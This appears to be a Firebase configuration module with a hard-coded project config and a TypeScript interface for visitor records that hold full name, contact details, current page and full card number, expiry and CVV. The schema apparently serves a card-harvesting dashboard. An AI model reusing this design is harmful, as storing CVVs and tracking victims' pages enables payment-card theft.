import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDunrPAssjA-ESc1jWfAuB-Rp6rcKh4Eso",
  authDomain: "fawran-5733b.firebaseapp.com",
  databaseURL: "https://fawran-5733b-default-rtdb.firebaseio.com",
  projectId: "fawran-5733b",
 storageBucket: "fawran-5733b.appspot.com",
  messagingSenderId: "793050907136",
  appId: "1:793050907136:web:765138a85531c008eb0ee5",
  measurementId: "G-3D0ZPNFXKL"
};
const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
